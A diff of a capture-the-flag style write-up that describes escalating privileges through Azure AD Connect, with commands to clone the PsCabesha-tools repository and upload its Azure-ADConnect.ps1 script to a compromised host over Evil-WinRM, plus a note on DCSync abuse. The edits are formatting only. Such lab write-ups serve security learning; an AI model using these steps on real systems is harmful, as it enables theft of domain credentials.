@@ -317,8 +317,9 @@ d-----         1/3/2020   5:28 AM                WindowsPowerShell
 ```
 
 We can take a look at [this post](https://blog.xpnsec.com/azuread-connect-for-redteam/) for privilege escalation to gain the admin account using `Azure AD connect`.<br>
-In short, if an user has `Replicating Directory Changes` permission within AD, we can perform `DCSync` to get all up-to-date AD objects from DCs.
+In short, if an user has `Replicating Directory Changes` permission within AD, we can perform `DCSync` to get all up-to-date AD objects from DCs.<br>
 Or we can use [this script](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1).<br>
+<br>
 On the local host, clone `PsCabesha-tools` repository.
 ```shell
 root@kali:~# git clone https://github.com/Hackplayers/PsCabesha-tools.git
@@ -331,7 +332,7 @@ Receiving objects: 100% (134/134), 553.60 KiB | 882.00 KiB/s, done.
 Resolving deltas: 100% (65/65), done.
 ```
 
-Upload the `/Privesc/Azure-ADConnect.ps1` in the repository.
+Upload the `Privesc/Azure-ADConnect.ps1` in the repository.
 ```shell
 *Evil-WinRM* PS C:\Users\mhope\Documents> upload /root/PsCabesha-tools/Privesc/Azure-ADConnect.ps1
 Info: Uploading /root/PsCabesha-tools/Privesc/Azure-ADConnect.ps1 to C:\Users\mhope\Documents\Azure-ADConnect.ps1
